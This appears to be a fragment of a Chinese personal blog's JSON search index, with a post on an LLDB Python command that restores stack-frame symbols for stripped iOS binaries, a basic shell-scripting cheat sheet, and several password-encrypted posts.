https://gist.github.com/yrp604/23e86dce9ca12bf514ef","tags":[{"name":"XNU","slug":"XNU","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"},{"name":"Kernel","slug":"Kernel","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"}]},{"title":"LLDB调试器栈符号化","date":"2018-10-03T05:27:59.000Z","path":"2018/10/03/xia0LLDB/xia0LLDB/","text":"强化你的lldb调试器Why?lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。 How?但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。 正好lldb提供了python的接口，可以开发自定义的命令。 And what ?虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在这里 这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下： update现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入sbt -f block-json-file-path即可加载该文件。效果如下： 原始的bt命令结果 sbt命令（没有加载block符号文件） sbt命令（带有block符号文件）","tags":[{"name":"python","slug":"python","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"},{"name":"LLDB","slug":"LLDB","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"}]},{"title":"unicorn","date":"2018-09-13T06:39:03.000Z","path":"2018/09/13/unicorn/unicorn/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"unicorn","slug":"unicorn","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"}]},{"title":"reversing-dot-kr","date":"2018-04-29T03:47:09.000Z","path":"2018/04/29/reversing-dot-kr/reversing-dot-kr/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"re","slug":"re","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"}]},{"title":"shellscript总结","date":"2018-04-17T10:33:40.000Z","path":"2018/04/17/shellscript/shellscript/","text":"shellscript总结变量name=&quot;zhang&quot; 变量名和等号之间不能有空格 英文，数字下划线，不能有空格，标点 不能以数字开头 不能是关键字 单引号/双引号 单引号会原样输出 双引号里面可以有变量，转义字符 字符串# 拼接 name=&#39;zhang&#39; helloname=&quot;hello, &quot;$name&quot;!&quot; helloname=&quot;hello, &quot;${name}&quot;!&quot; #获取长度 echo ${#name} # [out]:5 #提取子字符串 echo ${name:1:4} #[out]:hang 数组 my_array=(A B C D) echo &quot;数组的元素为: ${my_array[1]}&quot; echo &quot;数组的元素为: ${my_array[@]}&quot; #[out]: #数组的元素为: B #数组的元素为: A B C D 文件#文件存在且为目录 -d #文件存在且为一般文件 -f #文件存在且为链接文件 -L ifa=10 b=20 if [ $a == $b ];then echo &quot;a 等于 b&quot; elif [ $a -gt $b ];then echo &quot;a 大于 b&quot; elif [ $a -lt $b ];then echo &quot;a 小于 b&quot; else echo &quot;没有符合的条件&quot; fi # [out]:a 等于 b for# for in for loop in 1 2 3 4 5;do echo &quot;The value is: $loop&quot; done # [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5 xfindfunction xfind(){ find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0 grep -i $2 } if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot; else xfind $1 $2 fi xargs管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数 更多细节点这里 function函数返回值只能输0-255数字，且用$?接收 function test(){ read num return $num } test if [ $? -eq 1 ];then echo &quot;yes&quot; else echo &quot;no&quot; fi crontabhttp://wangchujiang.com/linux-command/c/crontab.html 默认日志路径:/var/mail/Username 修改邮件接收地址：MAILTO=939xxxx983@qq.com 日志重定向：* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1","tags":[{"name":"shell","slug":"shell","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"}]},{"title":"正则表达式","date":"2018-04-08T08:32:33.000Z","path":"2018/04/08/正则表达式/正则表达式/","text":"Need password to decrypt! Incorrect Password! No content to display! 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